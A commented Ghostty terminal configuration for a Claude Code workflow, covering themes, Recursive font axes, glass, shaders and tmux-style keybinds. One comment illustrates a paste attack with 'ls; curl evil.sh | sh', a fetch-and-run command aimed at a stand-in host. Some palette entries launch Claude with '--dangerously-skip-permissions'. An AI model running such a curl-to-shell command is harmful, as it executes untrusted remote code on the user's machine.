# ═══════════════════════════════════════════════════════════════
#  Ghostty — Claude Code edition
#  Active theme: see the `theme =` line below (a custom from ghostty/themes/,
#  the "stack theme" family). Typeface: Recursive.
#
#  NOTE: Ghostty does NOT allow inline comments on the same line
#  as a value. They always go on their own line.
# ═══════════════════════════════════════════════════════════════

# ─── theme ────────────────────────────────────────────────────
# Accepts a custom one from ghostty/themes/ (the stack family, below) or a
# Ghostty built-in (469 available, list them with `ghostty +list-themes`
# or preview at https://ghosttythemes.com).
# Warm built-in picks: Gruvbox Material Dark, Gruvbox Dark Hard, Everforest
# Dark Hard, Kanagawa Wave (dark) — Gruvbox Material Light, Rose Pine
# Dawn, Catppuccin Latte, Kanagawa Lotus (light). Solarized pick:
# Solarized Dark Patched (craftzdog style).
#
# NOTE: this `theme =` is THE active selection and the source of truth. Since
# the file is versioned, a `git pull` propagates the theme to the other
# machines. To change the look: `theme <id>` (scripts/theme edits this line
# and the equivalent one in nvim — they share the id), then commit.
#
# `solarized-patched` is a versioned, hex-verbatim copy of Ghostty's built-in
# "Solarized Dark Patched" (provenance in the theme file). It is selected by
# the copy, not the built-in name: the built-in lives inside Ghostty.app, where
# nvim and Windows Terminal cannot reach it, which would break the one-id rule.
theme = solarized-patched

# Custom themes — they live in `ghostty/themes/` (symlinked to
# <config-dir>/themes/ by install.sh). Canonical family of the stack (same
# id in Ghostty/nvim; to flip the look you edit the 2 configs):
#   · solarized-osaka — deep-ocean craftzdog style (near-black blue). In
#     Ghostty it's the `solarized-osaka` theme; the palette comes from the nvim plugin.
#   · solarized-patched — the "Solarized Dark Patched" cut, ported hex-verbatim
#     from the Ghostty built-in of that name. Darker canvas (#001e27) and every
#     accent re-tuned against canonical.
#   · retta — port of the Eclipse "Retta" theme: true black + cream text,
#     pumpkin keywords (#e79e3c).
#   · dia-de-muertos — the night of the vigil: morado canvas (#1d1022),
#     cempasúchil cursor (#fc9417), rosa mexicano, talavera, turquoise, bone
#     text. Hues from the altar, everything else set in OKLCH.
#   · blueprint — a drafting sheet at night: near-black canvas (#0a0a0a), cyan
#     drafting-line cursor (#4be4ff), redline red, cyanotype-white text. Comes
#     with its own shader (shaders/blueprint.glsl), switched with the theme.
# ─── canvas overrides ─────────────────────────────────────────
# These WIN over the theme's own values regardless of order, so whatever is
# uncommented here is what the terminal actually looks like.
#
# `background = #031219` is a deep ocean near-black blue over the patched cut's
# own #001e27. Comment it out when the active theme should own its canvas
# (`dia-de-muertos`, light themes).
#
# `foreground` is off, so the text is the theme's own (#708284 under
# solarized-patched, 4.72:1 on #031219). Solarized keeps body text muted on
# purpose so the accents carry the meaning. Louder options: #819090 (the cut's
# base1, 5.73:1), #eae3cb (its ANSI white, warmer) or #ffffff (19.01:1).
# Terminal only: nvim keeps its own theme's fg either way.
background = #031219
# foreground = #ffffff

# Display P3 wide-gamut — orange and cream saturate more on M-chip / Retina
# screens. No downside on non-P3 machines. `srgb` (Ghostty's default) is the
# choice for a palette that must match a browser exactly: `display-p3` reads
# every hex as a P3 coordinate, which pushes colours more saturated than CSS
# `rgb()` paints them.
window-colorspace = display-p3
# window-colorspace = srgb

# Automatic minimum contrast. Fine tradeoff:
#   1.1 = no enforcement (friendly default). Dim grays evaporate
#         in light themes, brand colors stay faithful.
#   3.0 = WCAG AA large-text. Rescues the worst grays but preserves
#         brand colors like Claude orange (#d97757, ratio 3.28:1 over
#         cream — passes untouched). Sweet spot for a light theme on a
#         cream or white canvas.
#   4.5 = WCAG AA body text. Rescues every gray but DISTORTS brand
#         colors: Claude orange ends up nearly black. Not recommended.
# The "3.0 for light themes" rule assumes a cream or white canvas; over a
# mid-tone light canvas (e.g. sage #abbab9) brand colours sit at 1.1–1.8:1 and
# 3.0 rewrites all of them into dark mud.
minimum-contrast = 1.1

# ─── typography ───────────────────────────────────────────────
# Recursive, the variable font (Arrow Type). One ttf with five axes, so the
# whole look is the `font-variation` lines below, not a family name: MONO 1 is
# the monospace, CASL 0 the Linear (non-casual) shapes, wght 400 roman and 700
# bold, slnt 0 upright, and CRSV 0.5 cursive forms only in the italics. The
# family is plain "Recursive" (nameID 16), with 64 named instances ("Mono
# Linear" …) as its styles. NOT a Nerd Font, and it carries no box drawing or
# powerline: Ghostty draws the box glyphs itself and the icons fall back into
# the NF casks in install.sh. Installed by brew (`font-recursive`, the Google
# Fonts build).
# The size is per-machine: `font-size` in config.local, not here.
# `ghostty +show-face --string=a --style=italic` is the check after touching
# this block: +validate-config passes and +show-config prints no font-* lines,
# so a family that fails to load only shows as Ghostty's JetBrains Mono fallback.
font-family = "Recursive"
font-family-italic = "Recursive"
font-family-bold-italic = "Recursive"

# Ghostty matches `font-style` against the style string the font advertises;
# for a variable font those are its fvar instance names (read with fc-scan),
# and the four below are the nearest named instances. What actually pins the
# face is `font-variation`, which sets all five axes per style: slnt -15, the
# axis minimum, for both italics. CRSV 0.5 is Recursive's own "auto": cursive
# shapes switch on only past slnt -14, so the roman stays plain and both
# italics are cursive.
# Claude Code emits bold as SGR 1 over its own text colour, so weight is the
# ONLY bold signal there: 400 against 700 is a wide enough gap to read.
font-style = Mono Linear
font-style-bold = Mono Linear Bold
font-style-italic = Mono Linear Italic
font-style-bold-italic = Mono Linear Bold Italic
font-variation = MONO=1
font-variation = CASL=0
font-variation = wght=400
font-variation = slnt=0
font-variation = CRSV=0.5
font-variation-bold = MONO=1
font-variation-bold = CASL=0
font-variation-bold = wght=700
font-variation-bold = slnt=0
font-variation-bold = CRSV=0.5
font-variation-italic = MONO=1
font-variation-italic = CASL=0
font-variation-italic = wght=400
font-variation-italic = slnt=-15
font-variation-italic = CRSV=0.5
font-variation-bold-italic = MONO=1
font-variation-bold-italic = CASL=0
font-variation-bold-italic = wght=700
font-variation-bold-italic = slnt=-15
font-variation-bold-italic = CRSV=0.5

# font-size is PER-MACHINE: the right size depends on the screen, so the key
# lives in ~/.config/ghostty/config.local (see `config-file` at the end of this
# file), not here. A machine without that file gets Ghostty's 13.

# Standard ligatures.
font-feature = +liga

# Recursive's code ligatures are `dlig`, off by default, so it is turned on here.
# Its ss01–ss12 and ss20 are glyph swaps, not ligatures, and stay off to keep
# the recursive.design recipe: ss01 single-story a, ss02 single-story g,
# ss03–ss06 simplified f i l r, ss07 simplified italic diagonals, ss08 no-serif
# L and Z, ss09 simplified 6 and 9, ss10 dotted zero, ss11 simplified 1, ss12
# simplified @, ss20 slashed zero.
font-feature = +dlig
# Three of those glyph swaps, picked on 2026-10-16: ss01 single-story a,
# ss02 single-story g, ss20 slashed zero.
font-feature = +ss01
font-feature = +ss02
font-feature = +ss20

# Off on Retina. This exists to compensate 1x panels; on a 2x
# display `true` implies the max `font-thicken-strength = 255` (that's the
# default when thickening is on, NOT a mild setting), which reads like a
# heavier weight but with smeared contours. On a non-Retina
# external monitor turn it back on — or keep it on with
# `font-thicken-strength = 40` for a bit of body without the smear.
font-thicken = false

# The font's own line height and advance.
adjust-cell-height = 0%

# Faint (SGR 2) text at 70% instead of the default 50%. Claude Code leans on
# faint constantly — paths, timestamps, hints, the dimmed half of a diff — and
# half opacity over a near-black canvas puts all of it near the floor of what is
# readable. 0.7 keeps the hierarchy without making faint compete with body text.
faint-opacity = 0.7

# Bold uses the bright half of the palette rather than the same colour at a
# heavier weight, so it reads as different from body text by colour too.
# In this palette the brights are the Solarized base greys plus orange and violet.
bold-color = bright

# ─── window ───────────────────────────────────────────────────
# `transparent`, Ghostty's own default, lets the window background through.
# `tabs` (the Chrome/Arc style, tab bar in the titlebar) is incompatible with
# the glass: it is a custom titlebar that ALWAYS paints the terminal's
# background colour, an opaque band across the top of a translucent window.
# Alternatives: tabs (opaque, integrated) · native (standard macOS, opaque) ·
# hidden (no titlebar; the top area then can't drag the window).
#
# NOTE this one does NOT apply on reload — the docs say changing it at runtime
# only affects NEW windows. ⌘N after ⌘⇧R, or the old titlebar stays.
macos-titlebar-style = transparent

# GLASS. Solid right now (opacity 1.0, no blur): the blueprint grid shader
# reads as paper only over a canvas that holds still.
#
# The other half of this lives in nvim: `transparent = true` on the ACTIVE theme's
# spec. Without it nvim paints an opaque canvas over the glass and the seam shows
# at every split edge, so the two move together, and a theme swap means checking
# the new spec carries it. A light theme cannot take glass: a light canvas over
# the glass is unreadable (see colorscheme.lua).
#
# Glass options:
#   background-opacity = 0.9 + background-blur = 20  (Ghostty's gaussian blur)
#   background-opacity = 0.9 + background-blur = macos-glass-clear  (the
#     system's own, highly transparent material, macOS 26+)
#   macos-glass-regular  (frosted; keeps a coloured canvas reading as itself)
# The glass carries its own opacity on top of `background-opacity`, and
# `background-opacity-cells` below pushes both onto cells that set their own
# background, which can leave lazygit panels and diff hunks looking thin.
background-opacity = 1.0
background-blur = 0

# `background-opacity` applies to the WINDOW background alone, so any cell
# carrying an explicit background colour stays fully opaque by default — Ghostty's
# own docs call out Neovim among the programs that repaint cell backgrounds
# and therefore "may not respect background-opacity (by design)". `true` extends
# the opacity to those cells too, which is what "the glass is only half on
# otherwise" means here.
#
# It also has to be `true` for a TUI colour to be able to DISAPPEAR. A theme that
# wants no band behind a line paints that line the canvas colour; with cells
# opaque, that block renders solid while the window around it is glass, so the
# "invisible" band comes out as a darker rectangle. Only when cells share the
# window's opacity does canvas-coloured mean actually unseen. claude/themes/
# solarized-patched.json depends on exactly that for its diff rows, so the two
# move together: turning this off means giving those rows a real colour again.
background-opacity-cells = true

# Blend alpha in linear space with the correction step. macOS defaults to
# `native` (Display P3); `linear-corrected` removes the darkening artifacts around
# glyph edges — worst on red/green pairs — while keeping text the same weight,
# which plain `linear` does not (it thins dark text and fattens light text).
# Only matters because there is transparency behind the glyphs; with a solid
# background the two are indistinguishable.
alpha-blending = linear-corrected

# ─── shaders ──────────────────────────────────────────────────
# Post-process passes over the rendered terminal, Shadertoy-style GLSL from
# ghostty/shaders/ (symlinked beside this file by install.sh; the path is
# relative to this file's directory). Repeat the key to chain passes.
#
# `crt`: a still CRT — scanlines, aperture grille, faint bloom, vignette. No
# curvature, no rolling band: the shader never reads iTime, so the animation
# loop below is off and the pass only re-renders when the terminal does.
# Strengths live as constants at the top of the file.
#
# A shader that fails to compile is silently skipped — the error goes to the
# system log, not to `+show-config`:
#   log show --predicate 'process == "ghostty"' --last 5m | grep -i shader
#
# Off; uncomment the one line to turn it on. `custom-shader-animation` stays
# set: it is inert without a shader and the CRT wants it false.
# custom-shader = shaders/crt.glsl
#
# `blueprint`: the terminal as a night blueprint sheet, made for
# the `blueprint` theme — a faint 24px minor / 120px major grey grid, a soft
# ink bleed around the glyphs and the grain of cyanotype paper. Static like
# the CRT. The line work is drawn only where the canvas
# shows (the glass, or cells a TUI paints in the canvas colour) and breaks
# around lettering, so it never crosses text, the selection or a coloured
# panel. The canvas is read from Ghostty's `iBackgroundColor`, so the shader
# follows whatever `background` the theme sets; its white halo is tuned for
# blueprint's near-black and would smudge a light canvas. Sizes are device
# pixels tuned at 2×: the grid stops 20px in, inside the padding below on a
# Retina screen (on a 1× screen it reaches into the first row).
# The line below is not hand-toggled: named after a theme, it belongs to it, and
# `theme <id>` turns it on for `blueprint` and comments it out for anything else.
# custom-shader = shaders/blueprint.glsl
custom-shader-animation = false

# breathe sideways — generous padding so that Claude Code's dense
# output (tool calls, diffs, trees) doesn't feel cramped.
window-padding-x = 22
window-padding-y = 18

# centers content on reflow
window-padding-balance = true

# extend = the padding inherits the color of the cell adjacent to the border
# (it looks more cohesive when selecting text near the margin).
window-padding-color = extend

# restores the session when reopening Ghostty
window-save-state = always

# ─── cursor ───────────────────────────────────────────────────
# Block + blink, Ghostty's own default shape. The
# color comes from the active theme (cursor-color + cursor-text); with a block
# `cursor-text` matters because the cursor covers the glyph underneath. Other
# options: bar (a thin caret), block_hollow, underline.
cursor-style = block

# A block that blinks is the loudest combination of
# the two axes — set this false for a steady cursor if it gets distracting.
cursor-style-blink = true

# ─── selection and copying ────────────────────────────────────
# selecting already copies (fast workflow)
copy-on-select = clipboard

# Trims trailing spaces/newlines when copying — avoids the classic
# "I pasted a command and it ran by itself because there was a \n at the end".
clipboard-trim-trailing-spaces = true

# Paste protection — Ghostty shows you a confirm dialog if the pasted
# text contains newlines or suspicious control characters
# (typical attack: copying "ls" from a website that's actually
# "ls; curl evil.sh | sh\n"). Cost: an occasional extra click.
clipboard-paste-protection = true

# ─── scrollback ───────────────────────────────────────────────
# Big buffer to re-read long outputs. The unit is BYTES, not lines: a
# line-count-looking `100000` is ~100 KB, below even the default (10 MB; 50 MB
# from 1.4, which renames the key `scrollback-limit-bytes` to say so and keeps
# this spelling as an alias).
scrollback-limit = 100000000

# ─── notifications ────────────────────────────────────────────
# Silence the bells — in SDD, interruptions break the flow.
# bell-features controls every mode of the bell.
bell-features = no-system,no-audio,no-attention,no-title,no-border

# ─── mouse ────────────────────────────────────────────────────
mouse-hide-while-typing = true

# ─── quick terminal (Quake-style drop-down) ───────────────────
# ⌥` opens a floating terminal on top of any app so you can
# check something without losing your main window's context.
# It closes with the same combo but the process stays alive
# in the background — ideal for keeping a persistent shell
# (claude, lazygit, REPLs) that you reopen instantly.
quick-terminal-position = top
# 100% = takes up the whole screen (full-screen popup). If at some
# point you want to go back to the small Quake-style "drop-down" mode,
# set 40% or 50%.
quick-terminal-size = 100%
quick-terminal-animation-duration = 0.15

# Stay open when focus moves to another app (macOS default is to hide). The
# premise of this surface here is a persistent shell — claude, lazygit,
# REPLs — so vanishing the moment you click a browser to read something is the
# opposite of what it is for. Closing is ⌥` again, deliberately.
quick-terminal-autohide = false

keybind = global:alt+grave_accent=toggle_quick_terminal

# ─── splits ───────────────────────────────────────────────────
# ⌘D opens a split on the right and ⌘⇧D a split below (Ghostty defaults).
# vim-style navigation between splits — key when you have
# [spec | implementation | tests] side by side.
keybind = cmd+alt+h=goto_split:left
keybind = cmd+alt+j=goto_split:bottom
keybind = cmd+alt+k=goto_split:top
keybind = cmd+alt+l=goto_split:right
keybind = cmd+shift+enter=toggle_split_zoom
keybind = cmd+alt+equal=equalize_splits

# ─── prefix: ⌘B, then a key ───────────────────────────────────
# A tmux-style prefix, as key sequences (Ghostty ≥ 1.3). ⌘B is free
# in Ghostty and in macOS; a Ctrl letter would not be, readline and fzf own
# them. Splits open in the pane's cwd (Ghostty's default). Letters only, v and
# s as in nvim's :vsplit / :split: `\`, `|` and `=` cost an AltGr or a Shift
# on the Latin American layout.
keybind = cmd+b>h=goto_split:left
keybind = cmd+b>j=goto_split:bottom
keybind = cmd+b>k=goto_split:top
keybind = cmd+b>l=goto_split:right
keybind = cmd+b>v=new_split:right
keybind = cmd+b>s=new_split:down
keybind = cmd+b>z=toggle_split_zoom
keybind = cmd+b>e=equalize_splits
keybind = cmd+b>x=close_surface
keybind = cmd+b>c=new_tab
keybind = cmd+b>n=next_tab
keybind = cmd+b>p=previous_tab
keybind = cmd+b>comma=prompt_tab_title

# Read-only pane: keys and mouse stop reaching the process, while selecting,
# scrolling and copying still work. For reading a running Claude without typing
# into it by mistake. FOOTGUN: it swallows input until toggled off with the same
# chord. ⌘B M lets the mouse select text even when nvim or a TUI captures it.
keybind = cmd+b>w=toggle_readonly
keybind = cmd+b>m=toggle_mouse_reporting

# Resize is a mode, not a chord: ⌘B R, then h/j/k/l as many times as needed.
# FOOTGUN: while it is active `catch_all` swallows every other key, so nothing
# reaches the shell. Esc or Enter leaves it.
keybind = cmd+b>r=activate_key_table:resize
keybind = resize/h=resize_split:left,30
keybind = resize/j=resize_split:down,30
keybind = resize/k=resize_split:up,30
keybind = resize/l=resize_split:right,30
keybind = resize/e=equalize_splits
keybind = resize/escape=deactivate_key_table
keybind = resize/enter=deactivate_key_table
keybind = resize/catch_all=ignore

# Scrollback into nvim (tmux's copy mode, with search, yank and motions):
# ⌘B O types `nvim <temp file with the whole scrollback>` at the prompt, no
# Enter. It TYPES, so at a shell prompt only; inside a TUI (Claude Code, nvim)
# use ⌘B Y, which just copies the path, and open it from a shell.
keybind = cmd+b>y=write_scrollback_file:copy
keybind = cmd+b>o=text:nvim\x20
keybind = chain=write_scrollback_file:paste

# ⌘⇧P palette entries. The Claude ones TYPE the command into the focused pane
# (Ghostty cannot start a process in a new split), so pick them at a shell
# prompt: anywhere else the text lands in whatever is running.
command-palette-entry = title:"Resize splits",description:"Modal resize: h/j/k/l, e equalizes, Esc leaves.",action:activate_key_table:resize
command-palette-entry = title:"Claude: here",description:"Types claude + Enter in the focused pane.",action:"text:claude\r"
command-palette-entry = title:"Claude: here, gateway",description:"Types claude --api + Enter in the focused pane.",action:"text:claude --api\r"
command-palette-entry = title:"Claude: here, skip permissions",description:"Types claude --dangerously-skip-permissions + Enter.",action:"text:claude --dangerously-skip-permissions\r"
command-palette-entry = title:"Claude: here, gateway, skip permissions",description:"Types claude --api --dangerously-skip-permissions + Enter.",action:"text:claude --api --dangerously-skip-permissions\r"

# Reset font-size — useful when doing demos or screen-sharing specs
keybind = cmd+zero=reset_font_size

# Shift+Enter = newline in Claude Code (instead of submit). Ghostty
# by default follows modifyOtherKeys and sends `\x1b[27;2;13~`, which
# Claude Code doesn't interpret as a newline. Sending `\n` directly does
# work — TUIs like nvim/lazygit don't see Shift+Enter without this
# but they don't need it either. Workaround documented in ghostty
# discussion #7780 and claude-code issue #5757.
keybind = shift+enter=text:\n

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 1 — macOS essentials
# ═══════════════════════════════════════════════════════════════

# Option (⌥) works as Alt → vim/zsh/emacs keybinds work.
# `left`: only the LEFT Option maps as Alt. The RIGHT Option
# stays free for special characters with an ES keyboard (⌥+ñ, ⌥+5 = €,
# ⌥+8 = •, ⌥+e = ´, etc.). Better than `true` (both) if you type specials.
macos-option-as-alt = left

# Give ⌥← / ⌥→ back to the running program. Ghostty binds them by default to
# `esc:b` / `esc:f` (readline word-jump, confirmed with
# `ghostty +list-keybinds --default`), which it then sends INSTEAD of the raw
# key — so nvim and any TUI that wants ⌥+arrow never sees it.
# `arrow_left` / `arrow_right` is what Ghostty prints in `+list-keybinds`;
# `alt+left` / `alt+right` parses too.
keybind = alt+left=unbind
keybind = alt+right=unbind

# Global show/hide of every Ghostty window from any app.
# Distinct from the quick terminal below (⌥` ), which summons a separate floating
# surface instead of toggling the real windows.
keybind = global:cmd+ctrl+shift+j=toggle_visibility

# Shell integration: enables the stand-by cursor with sudo,
# injects the path for opening files by click, etc.
shell-integration-features = cursor,sudo,title,no-ssh-env,no-ssh-terminfo,path

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 2 — Long-command notifications
# ═══════════════════════════════════════════════════════════════

# Notifies via macOS when a command finishes AND the window
# is in another app (it doesn't bug you if you're already looking at the terminal).
notify-on-command-finish = unfocused

# Only notifies if it took more than 10 seconds.
notify-on-command-finish-after = 10s

# Native macOS notification, without the bell sound.
notify-on-command-finish-action = no-bell,notify

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 3 — Visual polish
# ═══════════════════════════════════════════════════════════════

# Unfocused splits dim to 85% — you see instantly where you're typing.
unfocused-split-opacity = 0.85

# Shows the dimensions (cols×rows) when resizing the window.
resize-overlay = always
resize-overlay-position = center

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 4 — Productive keybinds
# ═══════════════════════════════════════════════════════════════

# Clears the screen (preserves the scrollback).
keybind = cmd+k=clear_screen

# Opens the config file with your default editor.
keybind = cmd+comma=open_config

# Reloads the config without restarting Ghostty.
keybind = cmd+shift+r=reload_config

# Copies the URL selected in the buffer to the clipboard.
keybind = cmd+shift+u=copy_url_to_clipboard

# Changes the current tab's title (useful for organizing SDD).
keybind = cmd+shift+i=prompt_surface_title

# Jump-to-prompt (requires shell-integration, already active above).
# Jumps to the previous/next prompt in the scrollback — key to
# re-read long Claude Code outputs without scrolling by hand.
keybind = cmd+up=jump_to_prompt:-1
keybind = cmd+down=jump_to_prompt:1

# Tabs by number: ⌘1..⌘9 jumps straight to that tab.
keybind = cmd+one=goto_tab:1
keybind = cmd+two=goto_tab:2
keybind = cmd+three=goto_tab:3
keybind = cmd+four=goto_tab:4
keybind = cmd+five=goto_tab:5
keybind = cmd+six=goto_tab:6
keybind = cmd+seven=goto_tab:7
keybind = cmd+eight=goto_tab:8
keybind = cmd+nine=goto_tab:9

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 5 — dock icon: the built-in `official` style
# ═══════════════════════════════════════════════════════════════

# `official` — Ghostty's own icon: a blue CRT gradient behind the
# glowing ghost and its `>_` prompt, in a dark chrome frame. It is the one the
# update dialog always shows regardless of this setting, so dock and updater
# agree.
#
# The icon does not follow `theme =` (Ghostty has no such binding), so a
# `custom-style` icon is a second palette to keep in sync by hand. If the blue
# has to go, that is the
# escape hatch — e.g. the terminal's own canvas as the screen:
#   macos-icon = custom-style
#   macos-icon-frame = aluminum
#   macos-icon-ghost-color = #ffffff
#   macos-icon-screen-color = #031219,#001e27
#
# Other built-in styles: glass (translucent), blueprint, chalkboard, xray,
# holographic, paper, retro, microchip. Note microchip is the GREEN board with an
# orange trace and xray the monochrome one — the names are easy to swap and the
# only way to tell is to look (the PNGs live in Assets.car, `MicrochipImage` /
# `XrayImage`). And `custom-style`, the only one that takes colors — it then
# REQUIRES macos-icon-frame (aluminum|beige|plastic|chrome),
# macos-icon-ghost-color and macos-icon-screen-color (a linear vertical
# gradient, first color = bottom). `macos-custom-icon` takes a PNG/ICNS path.
# Enumerated from `ghostty +show-config --default --docs` on 1.3.1.
macos-icon = official

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 6 — Fullscreen pro (macOS)
# ═══════════════════════════════════════════════════════════════

# Non-native fullscreen: without the macOS animated transition
# (it doesn't send Ghostty to another "space"), keeps the menubar visible.
# Much better for quick focus mode with ⌘↩.
# Other options: false (native), true (non-native without menubar).
macos-non-native-fullscreen = visible-menu

# If you prefer to hide the traffic lights (red/yellow/green) when
# you enter fullscreen for a cleaner view, uncomment:
# macos-window-buttons = hidden

# ─── per-machine ──────────────────────────────────────────────
# Unversioned overrides for this machine (font-size lives there). Ghostty loads
# an included file after this one wherever the line sits, so its values win; the
# `?` makes a missing file a no-op rather than an error.
config-file = ?~/.config/ghostty/config.local

